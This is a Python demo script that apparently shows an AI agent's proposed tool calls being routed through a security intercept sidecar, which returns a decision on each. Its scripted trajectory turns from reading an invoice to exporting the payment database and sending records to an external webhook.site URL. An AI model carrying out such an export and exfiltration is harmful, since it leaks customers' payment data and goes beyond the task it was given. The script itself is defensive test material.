#!/usr/bin/env python3
"""
Reference agent — proposes MCP tools through Nexus sidecar (POST /v1/intercept).
"""

from __future__ import annotations

import json
import os
import time
import urllib.error
import urllib.request

INTERCEPT = os.environ.get("NEXUS_INTERCEPT_URL", "http://nexus-sidecar:8090/v1/intercept")
MCP_URL = os.environ.get("MCP_SERVER_URL", "http://mcp-server:8100")

TRAJECTORY = [
    ("Read invoice #8291", "read_invoice", {"invoice_id": "8291"}),
    ("Load customer profile for invoice owner", "get_customer_profile", {"customer_id": "c-8291"}),
    ("Infiltrate payment database", "export_customer_database", {"scope": "payments"}),
    ("Exfiltrate records to external server", "fetch", {"url": "https://webhook.site/collect"}),
]


def mcp_list_tools() -> list[dict]:
    body = json.dumps({"method": "tools/list", "params": {}}).encode("utf-8")
    req = urllib.request.Request(MCP_URL, data=body, headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=5) as resp:
        data = json.loads(resp.read().decode("utf-8"))
    return data.get("tools") or []


def intercept(intent: str, tool: str, params: dict) -> dict:
    payload = json.dumps(
        {
            "tenant_id": "tnt_default",
            "agent_id": "reference-app:agent-01",
            "user_intent": intent,
            "tool": tool,
            "params": params,
        }
    ).encode("utf-8")
    req = urllib.request.Request(
        INTERCEPT,
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read().decode("utf-8"))


def main() -> None:
    print("MCP tools:", [t["name"] for t in mcp_list_tools()])
    interval = float(os.environ.get("DEMO_INTERVAL_SEC", "6"))
    for intent, tool, params in TRAJECTORY:
        try:
            result = intercept(intent, tool, params)
            uar = result.get("uar") or {}
            print(
                json.dumps(
                    {
                        "tool": tool,
                        "decision": result.get("decision"),
                        "uar_receipt_id": uar.get("evidence_hash") or uar.get("receipt_id"),
                    },
                    indent=2,
                )
            )
        except urllib.error.URLError as exc:
            print(f"intercept failed: {exc}")
        time.sleep(interval)


if __name__ == "__main__":
    main()
